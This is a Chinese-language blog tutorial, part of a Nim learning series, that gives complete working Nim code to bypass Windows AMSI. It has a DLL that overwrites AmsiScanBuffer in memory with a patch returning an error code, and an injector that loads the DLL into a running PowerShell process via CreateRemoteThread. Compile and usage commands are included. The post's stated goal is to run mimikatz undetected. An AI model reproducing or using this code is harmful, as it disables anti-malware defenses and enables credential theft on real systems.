# AMSI 绕过（nim学习系列）

AMSI(Anti-Malware Scan Interface)，即反恶意软件扫描接口，在win10和server2016上默认安装。如在使用mimikatz的powershell版时候会遇到错误（仅输入"Invoke-Mimikatz"字符串都被拦截）。

![截图](https://files-cdn.cnblogs.com/files/StudyCat/mimikatz0.bmp)

### 实现过程

不废话，直接上代码。我们将 byt3bl33d3r 的代码 [amsi_patch_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim) 编成 dll，然后注入 powershell 进程，实现 amsi bypass。

#### amsiBypass.nim

编译：nim c --app:lib --nomain --cpu=amd64 -d:release amsiBypass.nim

``` amsiBypass.nim
#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples
    License: BSD 3-Clause
    Referer: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
]#
import winim/lean
import strformat
import dynlib

when defined amd64:
    #echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    #echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        #echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    discard PatchAmsi()
    
  return true
```

#### dll 注入

这里主要参考了 https://github.com/saeedirha/DLL-Injector 的 C 语言代码进行修改。

编译：nim c --cpu:amd64 -d:release --opt:size dllInjector.nim

首先，编译 amsiBypass.nim 成 dll 文件。然后，启动一个 powershell 进程，通过任务管理器获取 PID。最后使用以下命令将 amsiBypass.dll 注入 powershell 进程，即可绕过 amsi，效果见截图。

使用：dllInjector.exe 14144 C:\Users\dell\Desktop\test\amsiBypass.dll

dllInjector.nim

``` dllInjector.nim
#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples
    License: BSD 3-Clause
    Referer: https://github.com/saeedirha/DLL-Injector
]#
import winim/lean
import dynlib
import os
import strutils

when defined(windows):
    let dllPath = paramStr(2)  #绝对路径    
    let pid = paramStr(1).parseInt() #powershell.exe 进程 pid
    
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](pid))   
    let alloc = VirtualAllocEx(hProcess, nil, dllPath.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    let IsWriteOK = WriteProcessMemory(hProcess, alloc, unsafeaddr dllPath[0], dllPath.len, nil)
    if IsWriteOK == 0:
        echo "Fail to write in Target Process memory"
        quit(QuitFailure)
           
    let lib = loadLib("kernel32.dll")
    if lib == nil:
        echo "Error loading library"
        quit(QuitFailure)


    let lpthreadStartRoutinefp = cast[LPTHREAD_START_ROUTINE](lib.symAddr("LoadLibraryA"))
    if lpthreadStartRoutinefp == nil:
        echo "Error loading 'LoadLibraryA' function from library"
        quit(QuitFailure)
    
    var dWord: DWORD
    CreateRemoteThread(hProcess, nil, 0, lpthreadStartRoutinefp, alloc, 0 ,addr dWord)    

    echo "[+]DLL Successfully Injected"
    
    unloadLib(lib)
```

现在可以放心使用 mimikatz 了。

![截图](https://files-cdn.cnblogs.com/files/StudyCat/mimikatz.bmp)